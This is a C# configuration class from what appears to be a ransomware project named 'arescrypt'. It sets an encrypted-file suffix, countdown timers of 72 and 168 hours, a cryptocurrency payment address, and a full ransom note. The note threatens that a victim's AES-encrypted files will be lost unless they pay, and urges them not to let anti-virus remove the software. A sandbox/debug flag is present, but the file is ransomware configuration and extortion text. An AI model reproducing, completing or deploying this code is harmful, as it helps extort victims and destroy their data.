namespace arescrypt
{
    class Configuration
    {
        public static string currentWorkingDirectory = System.IO.Path.GetDirectoryName(
            System.Reflection.Assembly.GetExecutingAssembly().Location);

        // Debugging configuration
        public bool sandBox = true; // Safemode for testing/debugging
        public string sandBoxDirectory = currentWorkingDirectory + @"\sandboxedDirectory";
        public bool debugMode = true; // Debug mode will enable/disable display of the Debug Console/GUI

        // Encryption/Decryption configuration
        public string encryptedFileSuffix = ".enc";

        // GUI Application configuration
        
        /* Timer application */
        // 168:00:00
        // 0xA8:0x00:0x00
        public int lostTimer_Hours = 0xA8; public int lostTimer_Minutes = 0x0; public int lostTimer_Seconds = 0x0;

        // 72:00:00
        // 0x48:0x00:0x00
        public int riseTimer_Hours = 0x48; public int riseTimer_Minutes = 0x0; public int riseTimer_Seconds = 0x0;

        public string cryptoAddress = "1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2"; // insert Bitcoin/Litecoin/Zcash address here
        public string customDisplayMessage =
@"What happened to your computer?
Your important file are encrypted!
Many of your documents, photos, videos, databases and others files are no longer
accessable because they have been encrypted with AES 256! Maybe you are looking for
away to recover your files. Do not waste your time trying to recover your files without paying for
a decryption key.

Can I recover my files?
YES! You just don't have enough time. You may pay in Bitcoins, Litecoin, or Zcash! You only have 
3 days to pay for a decrytion key, after that the price will double! If you do not pay in 7 days all of your files
will be gone forever.

How do I pay?
You can pay in the 3 payments posted. For more information please vist your coins website. Please send the correct 
amount to the addess on the screen. After you have paid, please click on <Check Payment> Once the payment is checked,
you can start decrypting your files! 

We strongly recommand you not to remove this software. Until you pay and the payment gets processed. If your anti-virus
updates and removes this software automaticaly. It will not be able to recover your files even if you pay!";
    }
}
